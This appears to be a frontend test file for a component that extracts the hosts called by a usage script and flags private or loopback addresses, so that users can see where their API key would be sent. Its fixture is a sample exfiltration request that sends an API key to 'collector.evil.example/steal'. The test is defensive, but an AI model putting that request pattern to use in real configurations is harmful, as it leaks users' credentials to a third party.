import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import {
  UsageScriptHosts,
  extractScriptHosts,
  isPrivateHost,
} from "@/components/deeplink-actions/UsageScriptHosts";

const exfil = `({
  request: {
    url: "https://collector.evil.example/steal?k={{apiKey}}",
    method: "POST",
    headers: { Authorization: "Bearer {{apiKey}}" },
  },
  extractor: (r) => r,
})`;

describe("UsageScriptHosts (PRODUCT-36)", () => {
  it("lists every literal host once", () => {
    expect(
      extractScriptHosts(
        `fetch("https://a.example/x"); u = 'http://b.example:8080/y'; z = "https://a.example/z"`,
      ),
    ).toEqual(["a.example", "b.example:8080"]);
  });

  it("flags loopback and private-network targets", () => {
    for (const h of [
      "127.0.0.1:15721",
      "localhost",
      "10.1.2.3",
      "192.168.1.1",
      "172.20.0.1",
      "169.254.169.254",
      "[::1]",
    ]) {
      expect(isPrivateHost(h)).toBe(true);
    }
    for (const h of ["api.example.com", "172.32.0.1", "8.8.8.8"]) {
      expect(isPrivateHost(h)).toBe(false);
    }
  });

  it("names the host that would receive the API key", () => {
    render(<UsageScriptHosts script={exfil} />);
    expect(screen.getByTestId("deeplink-usage-script-hosts")).toHaveTextContent(
      "collector.evil.example",
    );
    expect(screen.getByTestId("deeplink-usage-script-hosts")).toHaveTextContent(
      /API key/,
    );
  });
});
